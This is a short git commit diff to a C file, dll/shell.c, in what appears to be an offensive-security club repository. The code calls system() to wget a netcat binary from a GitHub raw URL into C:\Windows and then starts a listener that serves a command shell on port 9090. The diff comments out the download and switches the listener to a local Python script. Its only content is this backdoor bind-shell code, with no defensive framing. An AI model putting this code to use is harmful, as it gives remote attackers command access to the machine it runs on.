77e2ad499f3174571d33e9666acb9904a53c57e5
Josh <jpm7050@psu.edu>
2022-04-07 14:08:57 -0400

    shell

--- dll/shell.c
+++ dll/shell.c
@@ -6,9 +6,9 @@ int main ()
 
     int i;
     // https://raw.githubusercontent.com/stackviolator/ccso-offense/main/dll/nc.exe
-    i = system ("wget https://raw.githubusercontent.com/stackviolator/ccso-offense/main/dll/nc.exe -o C:\\Windows\\nc.exe");
-    Sleep(2000); // 10 seconds (10000 milliseconds)
-    i = system ("python c:\\windows\\nc.py -nlvp 9090 -l -c");
+    // i = system ("wget https://raw.githubusercontent.com/stackviolator/ccso-offense/main/dll/nc.exe -o \%C\%\\nc.exe");
+    // Sleep(2000); // 10 seconds (10000 milliseconds)
+    i = system ("python C:\\Users\\joshm\\Desktop\\ccso-offense\\dll\\nc.py -l -c -p 9090");
 
     return 0;
 }
